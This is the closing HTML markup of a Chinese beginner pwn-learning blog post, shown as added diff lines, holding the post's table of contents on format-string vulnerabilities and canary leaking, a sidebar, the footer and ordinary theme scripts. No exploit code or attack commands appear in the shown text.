+              <a href="/2022/06/21/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6Pwn-5.Ret2Text%E8%AF%A6%E8%A7%A3/" rel="prev" title="从0开始学Pwn-5.ROP-Ret2Text详解">
+                从0开始学Pwn-5.ROP-Ret2Text详解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/%5Bobject%20Object%5D"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">1.格式化字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="nav-text">使程序崩溃</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%A0%88%E5%86%85%E5%AE%B9"><span class="nav-text">查看栈内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A6%86%E5%86%99%E6%A0%88%E5%86%85%E5%AE%B9"><span class="nav-text">覆写栈内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%90%86%E8%A7%A3printf%E5%87%BD%E6%95%B0"><span class="nav-text">3.理解printf函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95-%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F3"><span class="nav-text">gdb调试(调试程序3)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95-%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8Fprintf1-c"><span class="nav-text">gdb调试(调试程序printf1.c)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8printf%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4Canary%E4%BF%9D%E6%8A%A4%EF%BC%88%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="nav-text">4.利用printf漏洞突破Canary保护（复现失败）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95-printf2-c"><span class="nav-text">gdb调试(printf2.c)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-1-%E6%A0%88%E9%A1%B6%E5%88%B0canary%E7%9A%84%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80%EF%BC%88%E8%A1%8C%E6%95%B0%EF%BC%89"><span class="nav-text">1-1.栈顶到canary的偏移地址（行数）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="nav-text">1-2.格式化漏洞常用符号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8printf%E6%B3%84%E9%9C%B2canary%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-text">2.利用printf泄露canary的地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-ret%E7%9A%84%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">3.ret的返回地址</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99exp"><span class="nav-text">编写exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%BB%BA%E8%AE%AE"><span class="nav-text">5.建议</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">csc8</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+</body>
+</html>
